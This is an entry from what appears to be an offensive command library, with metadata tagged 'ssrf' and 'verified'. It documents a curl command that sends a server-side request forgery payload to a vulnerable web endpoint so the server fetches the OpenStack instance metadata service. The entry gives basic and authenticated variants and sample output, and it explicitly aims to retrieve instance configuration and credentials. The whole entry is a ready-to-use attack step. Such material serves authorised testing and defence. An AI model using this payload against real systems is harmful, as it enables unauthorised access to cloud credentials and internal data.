---
id: cafd44ad-cbd3-4370-9a59-e93ce684766a
name: curl-access-openstack-metadata
type: command
executor: bash
data: >-
  curl -X POST $_TARGET_ENDPOINT -d "url=http://169.254.169.254/openstack" -H
  "Content-Type: application/x-www-form-urlencoded"
output: null
created_at: '2023-04-06T03:56:38.617387+00:00'
updated_at: '2023-10-01T00:00:00Z'
platforms:
  - Linux
  - Cloud
tags:
  - ssrf
  - curl
  - metadata
verified: true
validated: true
---

# curl-access-openstack-metadata

## Command

```bash
curl -X POST $_TARGET_ENDPOINT -d "url=http://169.254.169.254/openstack" -H "Content-Type: application/x-www-form-urlencoded"
```

## Description

This command uses curl to send an SSRF payload to a vulnerable endpoint on an OpenStack cloud instance, forcing it to fetch and return the contents of the internal metadata API. It is used in exploitation scenarios to retrieve instance configuration and credentials without direct access to the instance.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| $_TARGET_ENDPOINT | The URL of the vulnerable application endpoint (e.g., http://target-app.example.com/api/fetch) | Yes |
| -X POST | Specifies the HTTP method as POST | Yes |
| -d "url=..." | The SSRF payload parameter containing the metadata URL | Yes |
| -H "Content-Type: ..." | Sets the request header for form data | Yes |

## Examples

### Basic Usage

```bash
curl -X POST http://target-app.example.com/vulnerable -d "url=http://169.254.169.254/openstack"
```

### Advanced Usage with Authentication

```bash
curl -X POST http://target-app.example.com/vulnerable -d "url=http://169.254.169.254/openstack" -H "Authorization: Bearer $_TOKEN" -H "Content-Type: application/x-www-form-urlencoded"
```

## Expected Output

A successful response might include the metadata JSON from the OpenStack API, such as:

```json
{
  "instance_id": "i-1234567890abcdef0",
  "local_ipv4": "172.31.0.1",
  "security_groups": [{"name": "default"}],
  "availability_zone": "nova"
}
```

If the SSRF fails, expect HTTP errors like 403 Forbidden or empty responses indicating blocked internal requests.

## Related

- [[Related Procedure: Exploit-SSRF-to-Access-OpenStack-Metadata]]
- [[Related Command: curl-fetch-specific-metadata-path]]
